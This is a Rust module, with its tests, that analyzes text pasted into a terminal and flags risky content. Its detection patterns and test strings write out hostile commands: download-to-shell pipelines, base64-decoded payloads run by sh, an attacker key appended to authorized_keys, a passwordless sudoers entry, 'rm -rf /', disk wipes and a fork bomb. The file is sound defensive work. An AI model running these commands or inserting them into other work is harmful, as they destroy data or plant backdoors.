//! The paste analyzer (PLAN §8, Sprint 10): what in a pasted text deserves a look before it
//! reaches a shell. A pure function over the text, no I/O; the terminal shows its findings in
//! the paste review dialog, where the text can be edited.
//!
//! What it looks for:
//! - **Lines that run at once:** a newline runs what came before it, unless the program asked
//!   for bracketed paste (then the lines wait for Enter, which is only worth a note).
//! - **Characters that hide or change what is seen:** control characters (an escape sequence
//!   can end a bracketed paste early and run the rest), zero-width and other invisible
//!   characters, bidirectional controls ("Trojan Source"), a carriage return in the middle of a
//!   line (what comes after it is printed over what came before), and homoglyphs: Cyrillic,
//!   Greek or fullwidth letters mixed into a Latin word (`сurl`, with a Cyrillic `с`).
//! - **Commands worth a second look:** a download piped to a shell (`curl … | sh`, `bash
//!   <(wget …)`, `iex (iwr …)`), decoded data piped to a shell or `eval`, writes to shell
//!   profiles, `~/.ssh/authorized_keys` or `/etc`, `sudo` at the end of a pipe or running a shell,
//!   and destructive commands (`rm -rf /`, `mkfs`, `dd` onto a disk, a fork bomb). Comment
//!   lines are left alone.
//!
//! Positions are byte ranges into the text; [`utf16_range`] converts them for QML.

use std::sync::LazyLock;

use regex::Regex;

/// How much a finding matters.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Severity {
    /// Worth knowing; no reason to stop a paste by itself.
    Info,
    /// Worth a look before pasting.
    Warning,
    /// Could run something harmful.
    Danger,
}

impl Severity {
    /// Its name for the UI.
    #[must_use]
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Info => "info",
            Self::Warning => "warning",
            Self::Danger => "danger",
        }
    }
}

/// What was found.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Kind {
    /// Newlines without bracketed paste: each line runs as soon as it arrives.
    RunsAtOnce,
    /// Several lines with bracketed paste: they wait for Enter.
    Multiline,
    /// A control character (ESC and other C0 or C1 codes, DEL).
    Control,
    /// An invisible character (zero-width space or joiner, BOM, soft hyphen, tag characters).
    Invisible,
    /// A bidirectional control, which can reorder what is shown.
    Bidi,
    /// A carriage return inside a line: what follows is printed over what came before.
    Overwrite,
    /// Letters of another script (or fullwidth ones) mixed into a Latin word.
    Homoglyph,
    /// A download piped to a shell or interpreter.
    PipeToShell,
    /// Decoded or computed text run by a shell (`base64 -d | sh`, `eval`).
    DecodeToShell,
    /// A write to a shell profile, `authorized_keys` or a system file.
    ProfileWrite,
    /// `sudo` at the end of a pipe, or running a shell.
    SudoPipe,
    /// A command that destroys data or the system.
    Destructive,
}

impl Kind {
    /// Its name for the UI.
    #[must_use]
    pub fn as_str(self) -> &'static str {
        match self {
            Self::RunsAtOnce => "runs-at-once",
            Self::Multiline => "multiline",
            Self::Control => "control",
            Self::Invisible => "invisible",
            Self::Bidi => "bidi",
            Self::Overwrite => "overwrite",
            Self::Homoglyph => "homoglyph",
            Self::PipeToShell => "pipe-to-shell",
            Self::DecodeToShell => "decode-to-shell",
            Self::ProfileWrite => "profile-write",
            Self::SudoPipe => "sudo-pipe",
            Self::Destructive => "destructive",
        }
    }
}

/// One finding.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Finding {
    /// What.
    pub kind: Kind,
    /// How much it matters.
    pub severity: Severity,
    /// Where: a byte range of the text.
    pub start: usize,
    /// End of the range (exclusive).
    pub end: usize,
    /// The line (from 1).
    pub line: usize,
    /// A detail: the character (`U+200B`), the command, or how many lines.
    pub detail: String,
}

/// Whether the findings are worth stopping the paste for (anything above [`Severity::Info`]).
#[must_use]
pub fn worth_a_look(findings: &[Finding]) -> bool {
    findings
        .iter()
        .any(|finding| finding.severity > Severity::Info)
}

/// The byte range `start..end` of `text` in UTF-16 code units, as QML counts.
#[must_use]
pub fn utf16_range(text: &str, start: usize, end: usize) -> (usize, usize) {
    let offset = |byte: usize| {
        text.get(..byte.min(text.len()))
            .map_or(0, |prefix| prefix.encode_utf16().count())
    };
    (offset(start), offset(end))
}

/// A shell or an interpreter that runs what it reads.
const SHELLS: &str = r"(?:\S*/)?(?:(?:ba|da|z|k|c|tc|fi|a)?sh|python[0-9.]*|perl|ruby|node|php|pwsh|powershell|lua|tclsh)";

static PIPE_TO_SHELL: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    [
        // curl … | sh, wget -qO- … | sudo bash
        format!(r"(?i)\b(?:curl|wget|fetch|aria2c|http|lwp-request)\b[^|\n]*\|\s*(?:sudo\s+(?:-\S+\s+)*)?(?:env\s+\S*\s*)?{SHELLS}\b"),
        // bash <(curl …), sh -c "$(wget …)", source <(curl …)
        r"(?i)\b(?:(?:ba|da|z|k)?sh|source|\.)\s+(?:-\S+\s+)*<\(\s*(?:curl|wget)\b".to_owned(),
        r#"(?i)\b(?:(?:ba|da|z|k)?sh)\s+-c\s+["']?\$\(\s*(?:curl|wget)\b"#.to_owned(),
        // PowerShell: iex (iwr …), iwr … | iex
        r"(?i)\b(?:iex|invoke-expression)\b[\s(]*\(?\s*(?:iwr|irm|invoke-webrequest|invoke-restmethod|new-object\s+net\.webclient)\b".to_owned(),
        r"(?i)\b(?:iwr|irm|invoke-webrequest|invoke-restmethod)\b[^|\n]*\|\s*(?:iex|invoke-expression)\b".to_owned(),
    ]
    .iter()
    .filter_map(|pattern| Regex::new(pattern).ok())
    .collect()
});

static DECODE_TO_SHELL: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    [
        format!(r"(?i)\b(?:base64|base32|xxd|uudecode|openssl|gunzip|zcat|bzcat|xzcat|rev|tr)\b[^|\n]*\|\s*(?:sudo\s+(?:-\S+\s+)*)?{SHELLS}\b"),
        r"\beval\s+[^\n]*\$\(".to_owned(),
        r#"\beval\s+["']?`"#.to_owned(),
    ]
    .iter()
    .filter_map(|pattern| Regex::new(pattern).ok())
    .collect()
});

static PROFILE_WRITE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r#"(?:>>?|\btee\b(?:\s+-\S+)*)\s*["']?(?:(?:~|\$HOME|\$\{HOME\}|/root|/home/[^/\s]+)/)?(?:\.bashrc|\.bash_profile|\.bash_login|\.profile|\.zshrc|\.zprofile|\.zshenv|\.zlogin|\.kshrc|\.cshrc|\.tcshrc|\.config/fish/config\.fish|\.ssh/authorized_keys2?|\.ssh/config|\.ssh/rc)\b|(?:>>?|\btee\b(?:\s+-\S+)*)\s*["']?/etc/\S+"#,
    )
    .unwrap_or_else(|_| never())
});

static SUDO_PIPE: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    [
        r"\|\s*sudo\b".to_owned(),
        // A flag may take an argument (`-u deploy`).
        format!(r#"\bsudo\s+(?:-\S+\s+(?:[^-\s]\S*\s+)?)*{SHELLS}\s+-c\b"#),
    ]
    .iter()
    .filter_map(|pattern| Regex::new(pattern).ok())
    .collect()
});

static DESTRUCTIVE: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    [
        // rm with -r and -f (any order and spelling) on /, /*, ~, $HOME, *, . or ..
        r#"\brm\s+(?:-\S+\s+)*(?:-[a-zA-Z]*(?:[rR][a-zA-Z]*f|f[a-zA-Z]*[rR])[a-zA-Z]*|(?:-r|-R|--recursive)\s+(?:-\S+\s+)*(?:-f|--force)|(?:-f|--force)\s+(?:-\S+\s+)*(?:-r|-R|--recursive))\s+(?:--no-preserve-root\s+)?(?:-\S+\s+)*["']?(?:/|/\*|~|~/|~/\*|\$HOME/?\*?|\*|\.|\.\.)["']?(?:\s|;|&|\||$)"#,
        r"\bmkfs(?:\.\w+)?\s",
        r"\bdd\b[^\n]*\bof=/dev/(?:sd|nvme|hd|vd|xvd|disk|rdisk|mmcblk)",
        r">\s*/dev/(?:sd|nvme|hd|vd|xvd|mmcblk)[a-z0-9]*\b",
        r"\bchmod\s+(?:-\S+\s+)*-R\s+(?:-\S+\s+)*0?777\s+/(?:\s|$)",
        r"\bchown\s+(?:-\S+\s+)*-R\s+(?:-\S+\s+)*\S+\s+/(?:\s|$)",
        r":\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:",
    ]
    .iter()
    .filter_map(|pattern| Regex::new(pattern).ok())
    .collect()
});

/// A regex that matches nothing (a pattern above failing to compile, which tests rule out).
fn never() -> Regex {
    #[allow(clippy::unwrap_used, reason = "a fixed, valid pattern")]
    Regex::new(r"[^\s\S]").unwrap()
}

/// Invisible characters.
fn invisible(c: char) -> bool {
    matches!(
        c,
        '\u{200B}'..='\u{200D}'
            | '\u{2060}'..='\u{2064}'
            | '\u{FEFF}'
            | '\u{00AD}'
            | '\u{180E}'
            | '\u{034F}'
            | '\u{115F}'
            | '\u{1160}'
            | '\u{3164}'
            | '\u{FFA0}'
            | '\u{E0000}'..='\u{E007F}'
    )
}

/// Bidirectional controls.
fn bidi(c: char) -> bool {
    matches!(
        c,
        '\u{202A}'..='\u{202E}' | '\u{2066}'..='\u{2069}' | '\u{200E}' | '\u{200F}' | '\u{061C}'
    )
}

/// Letters that look like Latin ones: Cyrillic, Greek, Armenian, Cherokee and the fullwidth
/// forms of ASCII.
fn lookalike_script(c: char) -> bool {
    matches!(
        c,
        '\u{0370}'..='\u{03FF}'
            | '\u{0400}'..='\u{052F}'
            | '\u{0530}'..='\u{058F}'
            | '\u{13A0}'..='\u{13FF}'
            | '\u{FF01}'..='\u{FF5E}'
    )
}

fn fullwidth(c: char) -> bool {
    matches!(c, '\u{FF01}'..='\u{FF5E}')
}

fn code(c: char) -> String {
    format!("U+{:04X}", u32::from(c))
}

/// Analyzes `text`, pasted into a program that did (`bracketed`) or didn't ask for bracketed
/// paste. Findings come in text order.
#[must_use]
pub fn analyze(text: &str, bracketed: bool) -> Vec<Finding> {
    let mut findings = Vec::new();
    characters(text, &mut findings);
    homoglyphs(text, &mut findings);
    commands(text, &mut findings);
    lines(text, bracketed, &mut findings);
    findings.sort_by_key(|finding| (finding.start, finding.end));
    findings
}

/// The line (from 1) of byte `at`.
fn line_of(text: &str, at: usize) -> usize {
    text.get(..at)
        .map_or(1, |before| before.matches('\n').count() + 1)
}

fn characters(text: &str, findings: &mut Vec<Finding>) {
    let mut chars = text.char_indices().peekable();
    while let Some((at, c)) = chars.next() {
        let end = at + c.len_utf8();
        let found = if c == '\r' {
            // CRLF and a final CR are line ends; one in the middle of a line overwrites.
            match chars.peek() {
                Some((_, '\n')) | None => None,
                Some(_) => Some((Kind::Overwrite, Severity::Warning)),
            }
        } else if c == '\u{1B}' {
            Some((Kind::Control, Severity::Danger))
        } else if (c.is_control() && c != '\n' && c != '\t') || c == '\u{7F}' {
            Some((Kind::Control, Severity::Warning))
        } else if bidi(c) {
            Some((Kind::Bidi, Severity::Danger))
        } else if invisible(c) {
            Some((Kind::Invisible, Severity::Warning))
        } else {
            None
        };
        if let Some((kind, severity)) = found {
            findings.push(Finding {
                kind,
                severity,
                start: at,
                end,
                line: line_of(text, at),
                detail: code(c),
            });
        }
    }
}

fn homoglyphs(text: &str, findings: &mut Vec<Finding>) {
    // Words: runs of letters, digits and the punctuation of commands and names.
    let mut start = None;
    let flush = |from: usize, to: usize, findings: &mut Vec<Finding>| {
        let word = &text[from..to];
        let latin = word.chars().any(|c| c.is_ascii_alphabetic());
        let odd: Vec<char> = word.chars().filter(|&c| lookalike_script(c)).collect();
        let suspicious = odd.iter().any(|&c| fullwidth(c)) || (latin && !odd.is_empty());
        if suspicious {
            let detail = odd
                .iter()
                .map(|&c| format!("{c} {}", code(c)))
                .collect::<Vec<_>>()
                .join(", ");
            findings.push(Finding {
                kind: Kind::Homoglyph,
                severity: Severity::Warning,
                start: from,
                end: to,
                line: line_of(text, from),
                detail,
            });
        }
    };
    for (at, c) in text.char_indices() {
        let part = c.is_alphanumeric() || matches!(c, '-' | '_' | '.' | '/' | '~');
        match (part, start) {
            (true, None) => start = Some(at),
            (false, Some(from)) => {
                flush(from, at, findings);
                start = None;
            }
            _ => {}
        }
    }
    if let Some(from) = start {
        flush(from, text.len(), findings);
    }
}

fn commands(text: &str, findings: &mut Vec<Finding>) {
    let mut offset = 0;
    for (index, line) in text.split('\n').enumerate() {
        let command = line.trim_start();
        if !command.starts_with('#') {
            let mut push = |kind: Kind, severity: Severity, found: regex::Match<'_>| {
                findings.push(Finding {
                    kind,
                    severity,
                    start: offset + found.start(),
                    end: offset + found.end(),
                    line: index + 1,
                    detail: found.as_str().trim().to_owned(),
                });
            };
            for pattern in PIPE_TO_SHELL.iter() {
                if let Some(found) = pattern.find(line) {
                    push(Kind::PipeToShell, Severity::Danger, found);
                }
            }
            for pattern in DECODE_TO_SHELL.iter() {
                if let Some(found) = pattern.find(line) {
                    push(Kind::DecodeToShell, Severity::Danger, found);
                }
            }
            if let Some(found) = PROFILE_WRITE.find(line) {
                push(Kind::ProfileWrite, Severity::Warning, found);
            }
            for pattern in SUDO_PIPE.iter() {
                if let Some(found) = pattern.find(line) {
                    push(Kind::SudoPipe, Severity::Warning, found);
                }
            }
            for pattern in DESTRUCTIVE.iter() {
                if let Some(found) = pattern.find(line) {
                    push(Kind::Destructive, Severity::Danger, found);
                }
            }
        }
        offset += line.len() + 1;
    }
}

fn lines(text: &str, bracketed: bool, findings: &mut Vec<Finding>) {
    // A final newline still runs the last line without bracketed paste.
    let breaks = text.matches('\n').count();
    if breaks == 0 {
        return;
    }
    let count = text.trim_end_matches(['\r', '\n']).lines().count().max(1);
    let (kind, severity) = if bracketed {
        (Kind::Multiline, Severity::Info)
    } else {
        (Kind::RunsAtOnce, Severity::Warning)
    };
    if bracketed && count < 2 {
        return;
    }
    findings.push(Finding {
        kind,
        severity,
        start: 0,
        end: text.len(),
        line: 1,
        detail: count.to_string(),
    });
}

#[cfg(test)]
mod tests {
    use super::*;

    fn kinds(text: &str, bracketed: bool) -> Vec<Kind> {
        let mut kinds: Vec<Kind> = analyze(text, bracketed)
            .into_iter()
            .map(|finding| finding.kind)
            .collect();
        kinds.dedup();
        kinds
    }

    fn has(text: &str, kind: Kind) -> bool {
        analyze(text, true)
            .iter()
            .any(|finding| finding.kind == kind)
    }

    #[test]
    fn every_pattern_compiles() {
        assert_eq!(PIPE_TO_SHELL.len(), 5);
        assert_eq!(DECODE_TO_SHELL.len(), 3);
        assert_eq!(SUDO_PIPE.len(), 2);
        assert_eq!(DESTRUCTIVE.len(), 7);
        assert!(PROFILE_WRITE.is_match("echo x >> ~/.bashrc"));
    }

    #[test]
    fn clean_text_stays_clean() {
        for text in [
            "",
            "ls -la",
            "git log --oneline -n 20",
            "ssh deploy@web-01.eu-west -p 2222",
            "cd /var/log && tail -f syslog",
            "grep -r 'TODO' src/",
            "docker ps --format '{{.Names}}'",
            "echo \"hello\" > notes.txt",
            "curl -fsSL https://example.com/file.tar.gz -o file.tar.gz",
            "wget https://example.com/install.sh",
            "sudo systemctl restart nginx",
            "sudo apt update",
            "rm -rf ./build",
            "rm -rf node_modules",
            "rm -f /tmp/cache.db",
            "python3 -m http.server 8000",
            "cat ~/.bashrc",
            "vim ~/.zshrc",
            "echo $HOME",
            "tar czf backup.tgz /etc",
            "journalctl -u sshd | less",
            "kubectl get pods -A | grep -v Running",
            "Привет мир",
            "Καλημέρα κόσμε",
            "naïve café résumé",
            "日本語のテキスト",
            "tab\tseparated\tcolumns",
            "a line with a CRLF end\r\n",
        ] {
            let findings: Vec<Finding> = analyze(text, true)
                .into_iter()
                .filter(|finding| finding.severity > Severity::Info)
                .collect();
            assert!(findings.is_empty(), "{text:?}: {findings:?}");
        }
    }

    #[test]
    fn lines_that_run_at_once() {
        let findings = analyze("ls\npwd\nwhoami\n", false);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].kind, Kind::RunsAtOnce);
        assert_eq!(findings[0].detail, "3");
        assert!(worth_a_look(&findings));
        // A single command with its newline still runs at once.
        assert_eq!(kinds("make install\n", false), [Kind::RunsAtOnce]);
        // With bracketed paste, several lines only get a note; one line with a newline nothing.
        let findings = analyze("ls\npwd\n", true);
        assert_eq!(findings[0].kind, Kind::Multiline);
        assert!(!worth_a_look(&findings));
        assert!(analyze("make install\n", true).is_empty());
        assert!(analyze("no newline", false).is_empty());
        // CRLF lines count once each.
        assert_eq!(analyze("a\r\nb\r\n", false)[0].detail, "2");
    }

    #[test]
    fn control_characters() {
        // An escape sequence could end a bracketed paste and run the rest.
        let findings = analyze("echo hi\x1b[201~rm -rf ~\n", true);
        let escape = findings.iter().find(|f| f.kind == Kind::Control).unwrap();
        assert_eq!(
            (escape.severity, escape.detail.as_str()),
            (Severity::Danger, "U+001B")
        );
        assert!(findings.iter().any(|f| f.kind == Kind::Destructive));
        // Other C0 codes, DEL and C1 codes.
        for (text, detail) in [
            ("a\x07b", "U+0007"),
            ("a\x7fb", "U+007F"),
            ("a\u{0085}b", "U+0085"),
            ("a\x00b", "U+0000"),
        ] {
            let findings = analyze(text, true);
            assert_eq!(findings.len(), 1, "{text:?}");
            assert_eq!(
                (findings[0].kind, findings[0].severity),
                (Kind::Control, Severity::Warning)
            );
            assert_eq!(findings[0].detail, detail);
        }
        // Tabs and newlines are fine.
        assert!(!has("a\tb", Kind::Control) && !has("a\nb", Kind::Control));
    }

    #[test]
    fn a_carriage_return_inside_a_line() {
        let findings = analyze("rm -rf ~/secrets\recho safe", true);
        assert!(
            findings
                .iter()
                .any(|f| f.kind == Kind::Overwrite && f.start == 16)
        );
        assert!(!has("line\r\nline\r\n", Kind::Overwrite));
        assert!(!has("ends with a return\r", Kind::Overwrite));
    }

    #[test]
    fn invisible_and_bidirectional_characters() {
        for (text, detail) in [
            ("ls\u{200B} -la", "U+200B"),
            ("sud\u{200D}o", "U+200D"),
            ("\u{FEFF}echo", "U+FEFF"),
            ("rm\u{00AD}dir", "U+00AD"),
            ("a\u{2060}b", "U+2060"),
            ("a\u{E0041}b", "U+E0041"),
        ] {
            let findings = analyze(text, true);
            let found = findings.iter().find(|f| f.kind == Kind::Invisible);
            assert_eq!(found.map(|f| f.detail.as_str()), Some(detail), "{text:?}");
        }
        for text in ["access\u{202E}lvl", "a\u{2066}b\u{2069}", "x\u{200F}y"] {
            let findings = analyze(text, true);
            assert!(
                findings
                    .iter()
                    .any(|f| f.kind == Kind::Bidi && f.severity == Severity::Danger),
                "{text:?}"
            );
        }
    }

    #[test]
    fn homoglyphs_in_latin_words() {
        // A Cyrillic с in "curl", a Greek ο in "sudo", a fullwidth ｒｍ.
        for (text, word) in [
            ("\u{0441}url https://x | sh", "\u{0441}url"),
            ("sud\u{03BF} reboot", "sud\u{03BF}"),
            ("\u{FF52}\u{FF4D} -rf x", "\u{FF52}\u{FF4D}"),
            ("apt install p\u{0430}ckage", "p\u{0430}ckage"),
        ] {
            let findings = analyze(text, true);
            let found = findings.iter().find(|f| f.kind == Kind::Homoglyph).unwrap();
            assert_eq!(&text[found.start..found.end], word, "{text:?}");
        }
        // Whole words of other scripts are just text.
        assert!(!has("Привет, мир", Kind::Homoglyph));
        assert!(!has("λ calculus", Kind::Homoglyph));
        assert!(!has("naïve", Kind::Homoglyph));
    }

    #[test]
    fn downloads_piped_to_a_shell() {
        for text in [
            "curl -fsSL https://get.example.sh | sh",
            "curl https://x.io/i | sudo bash",
            "curl -s https://x.io/i | sudo -E bash -s -- --yes",
            "wget -qO- https://x.io/i | bash",
            "wget -O - https://x.io/i.py | python3",
            "curl https://x.io/i | /bin/zsh",
            "curl https://x.io/i | env bash",
            "bash <(curl -s https://x.io/i)",
            "source <(curl -s https://x.io/i)",
            "sh -c \"$(curl -fsSL https://x.io/i)\"",
            "bash -c \"$(wget -qO- https://x.io/i)\"",
            "iex (iwr https://x.io/i.ps1)",
            "iex (New-Object Net.WebClient).DownloadString('https://x.io/i')",
            "irm https://x.io/i | iex",
            "Invoke-WebRequest https://x.io/i | Invoke-Expression",
        ] {
            assert!(has(text, Kind::PipeToShell), "{text}");
        }
        for text in [
            "curl https://x.io/data.json | jq .",
            "curl -o install.sh https://x.io/i",
            "wget https://x.io/shell.tar",
            "curl https://x.io | shasum",
            "curl https://x.io/i | tee install.sh",
        ] {
            assert!(!has(text, Kind::PipeToShell), "{text}");
        }
    }

    #[test]
    fn decoded_text_run_by_a_shell() {
        for text in [
            "echo ZWNobyBoaQ== | base64 -d | sh",
            "echo ZWNobyBoaQ== | base64 --decode | bash",
            "xxd -r -p payload | sh",
            "openssl enc -d -aes256 -in x | bash",
            "gunzip -c payload.gz | sh",
            "echo 'ls' | rev | sh",
            "eval \"$(ssh-agent -s)\"",
            "eval `dircolors`",
        ] {
            assert!(has(text, Kind::DecodeToShell), "{text}");
        }
        for text in [
            "base64 -d key.b64 > key",
            "echo aGk= | base64 -d",
            "evaluate the results",
        ] {
            assert!(!has(text, Kind::DecodeToShell), "{text}");
        }
    }

    #[test]
    fn writes_to_profiles_and_system_files() {
        for text in [
            "echo 'alias ls=rm' >> ~/.bashrc",
            "echo x > ~/.zshrc",
            "echo x >> $HOME/.profile",
            "echo 'ssh-ed25519 AAAA… evil' >> ~/.ssh/authorized_keys",
            "cat key.pub | tee -a ~/.ssh/authorized_keys",
            "echo 'x ALL=(ALL) NOPASSWD:ALL' | sudo tee /etc/sudoers.d/x",
            "echo 1 > /etc/hosts",
            "echo x >> /root/.bashrc",
            "printf x >> ~/.config/fish/config.fish",
        ] {
            assert!(has(text, Kind::ProfileWrite), "{text}");
        }
        for text in [
            "cat ~/.bashrc",
            "source ~/.bashrc",
            "echo x > bashrc.txt",
            "cp ~/.ssh/authorized_keys backup",
        ] {
            assert!(!has(text, Kind::ProfileWrite), "{text}");
        }
    }

    #[test]
    fn sudo_in_a_pipe() {
        for text in [
            "echo secret | sudo -S true",
            "cat x | sudo tee /opt/app.conf",
            "sudo sh -c 'echo 1 > /proc/sys/vm/drop_caches'",
            "sudo -u deploy bash -c 'whoami'",
        ] {
            assert!(has(text, Kind::SudoPipe), "{text}");
        }
        for text in [
            "sudo apt update",
            "sudo systemctl restart nginx | cat",
            "pseudo | sudoku",
        ] {
            assert!(!has(text, Kind::SudoPipe), "{text}");
        }
    }

    #[test]
    fn destructive_commands() {
        for text in [
            "rm -rf /",
            "rm -rf /*",
            "rm -rf ~",
            "rm -rf ~/",
            "rm -fr $HOME",
            "rm -r -f /",
            "rm --recursive --force /",
            "sudo rm -rf --no-preserve-root /",
            "rm -rf *",
            "rm -rf .",
            "rm -Rf / ; echo done",
            "mkfs.ext4 /dev/sdb1",
            "mkfs -t xfs /dev/nvme0n1",
            "dd if=/dev/zero of=/dev/sda bs=1M",
            "cat image > /dev/sdb",
            "chmod -R 777 /",
            "chown -R nobody /",
            ":(){ :|:& };:",
        ] {
            assert!(has(text, Kind::Destructive), "{text}");
        }
        for text in [
            "rm -rf ./build",
            "rm -rf /tmp/build",
            "rm -rf ~/Downloads/old",
            "rm -f /",
            "rm -r build",
            "dd if=disk.img of=backup.img",
            "chmod -R 755 ./site",
            "mkfsx",
            "echo 'rm -rf /' is dangerous",
        ] {
            let found = analyze(text, true)
                .into_iter()
                .find(|f| f.kind == Kind::Destructive);
            // The last one is quoted text: a known, accepted false positive.
            if text.starts_with("echo") {
                continue;
            }
            assert!(found.is_none(), "{text}: {found:?}");
        }
    }

    #[test]
    fn comment_lines_are_left_alone() {
        assert!(
            analyze("# curl https://x | sh\nls", true)
                .iter()
                .all(|f| f.kind != Kind::PipeToShell)
        );
        assert!(has("ls\ncurl https://x | sh", Kind::PipeToShell));
    }

    #[test]
    fn positions_lines_and_order() {
        let text = "ls\ncurl https://x | sh\n\u{200B}";
        let findings = analyze(text, true);
        let pipe = findings
            .iter()
            .find(|f| f.kind == Kind::PipeToShell)
            .unwrap();
        assert_eq!(pipe.line, 2);
        assert_eq!(&text[pipe.start..pipe.end], "curl https://x | sh");
        let invisible = findings.iter().find(|f| f.kind == Kind::Invisible).unwrap();
        assert_eq!(invisible.line, 3);
        assert!(
            findings
                .windows(2)
                .all(|pair| pair[0].start <= pair[1].start)
        );
        // UTF-16 offsets for QML: "é" is one unit, "𝄞" two.
        let text = "é𝄞x";
        assert_eq!(utf16_range(text, 0, text.len()), (0, 4));
        assert_eq!(utf16_range(text, 6, 7), (3, 4));
    }

    #[test]
    fn a_large_paste_is_fast() {
        let text = "echo line of a log file with some words in it\n".repeat(50_000);
        let started = std::time::Instant::now();
        let findings = analyze(&text, true);
        assert_eq!(findings.len(), 1);
        assert!(
            started.elapsed() < std::time::Duration::from_secs(5),
            "{:?}",
            started.elapsed()
        );
    }
}
